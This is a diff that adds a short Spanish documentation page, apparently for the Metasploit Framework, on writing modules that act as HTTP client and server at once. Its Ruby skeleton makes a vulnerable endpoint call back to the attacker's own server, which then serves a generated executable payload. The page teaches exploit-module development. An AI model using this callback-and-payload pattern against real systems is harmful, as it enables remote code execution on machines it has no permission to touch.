@@ -1,0 +1,26 @@
+---
+title: "Cómo escribir un módulo usando HttpServer y HttpClient"
+description: Módulos que actúan simultáneamente como cliente y servidor HTTP.
+---
+
+Algunos exploits necesitan actuar en ambos roles a la vez: usan `HttpClient` para autenticarse o disparar una acción en el objetivo (por ejemplo, forzar que descargue un recurso), y a la vez levantan un `HttpServer` propio para recibir esa petición y entregar el payload — el patrón típico de un exploit de **inyección de plantilla del lado del servidor (SSTI)** o de una vulnerabilidad **XXE fuera de banda**, donde el objetivo hace un callback HTTP hacia el atacante.
+
+```ruby
+include Msf::Exploit::Remote::HttpClient
+include Msf::Exploit::Remote::HttpServer
+
+def on_request_uri(cli, request)
+  print_status('El objetivo llamó de vuelta, entregando payload')
+  send_response(cli, generate_payload_exe)
+end
+
+def exploit
+  start_service
+  send_request_cgi(
+    'uri'       => '/vulnerable-endpoint',
+    'vars_post' => { 'callback_url' => "http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/pl" }
+  )
+end
+```
+
+La parte delicada de este patrón es la coordinación de tiempos: el servidor debe estar arriba (`start_service`) **antes** de disparar la acción que provoca el callback, y normalmente conviene dejar el módulo corriendo como job (`exploit -j`) para no bloquear la consola esperando la respuesta.
